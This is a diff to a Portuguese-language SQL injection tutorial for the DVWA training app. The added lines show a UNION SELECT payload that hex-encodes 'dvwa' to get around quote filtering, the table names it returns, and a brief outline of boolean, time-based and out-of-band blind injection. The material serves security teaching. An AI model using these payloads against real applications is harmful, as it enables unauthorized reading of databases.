@@ -255,5 +255,35 @@ ID: 1 union select database(), user() --
 First name: dvwa
 Surname: root@localhost
 ```
+Nas clausulas condicionais é preciso converter o texto para hexadecimal, uma vez que **'** não são aceitas. Exemplo:
+
+`1 union select table_name, 2 from information_schema.tables where table_schema=0x64767761 --`
+
+Onde dvwa = 64767761 (substituição de 'dvwa' por 0x64767761)
+
+Resultado:
+```
+ID: 1 union select table_name, 2 from information_schema.tables where table_schema=0x64767761 --
+First name: admin
+Surname: admin
+
+ID: 1 union select table_name, 2 from information_schema.tables where table_schema=0x64767761 --
+First name: guestbook
+Surname: 2
+
+ID: 1 union select table_name, 2 from information_schema.tables where table_schema=0x64767761 --
+First name: users
+Surname: 2
+```
+
 E assim por diante...
+
+---
+## Blind
+
+Injeção de SQL em que a aplicação não exibe erros ou dados diretamente. Mesmo assim, você consegue “perguntar” à base e inferir respostas observando mudanças no comportamento da aplicação:
+
+* **Boolean-based:** a página muda (ou não) conforme a condição é verdadeira/falsa.
+* **Time-based:** a resposta demora quando a condição é verdadeira (ex.: SLEEP(5)).
+* **Out-of-band:** menos comum, a base faz uma requisição externa se a condição for verdadeira.
 
